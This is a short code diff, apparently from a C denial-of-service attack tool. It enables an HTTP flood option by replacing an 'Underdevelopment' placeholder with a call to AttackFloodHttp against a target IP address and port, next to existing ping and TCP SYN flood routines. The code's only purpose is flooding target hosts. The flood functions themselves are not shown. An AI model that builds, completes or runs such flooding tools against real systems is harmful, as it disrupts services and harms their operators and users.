@@ -7,6 +7,7 @@
 #include "AttackFloodPing.h"
 #include "AttackDOS.h"
 #include "AttackFloodTcpSyn.h"
+#include "AttackFloodHttp.h"
 
 UCHAR GenRandChar() {
 	return rand() % 256;
@@ -42,7 +43,7 @@ BOOL AttackDos(DosStruct dosStruct) {
 		AttackFloodPing(dosStruct.ipAddress, dosStruct.dataSize, dosStruct.time);
 		break;
 	case  HTTP_FLOOD:
-		printf("[d] Underdevelopment !!!\n\n");
+		AttackFloodHttp(dosStruct.ipAddress, dosStruct.port, dosStruct.dataSize, dosStruct.time, FALSE);
 		break;
 	default:
 		break;
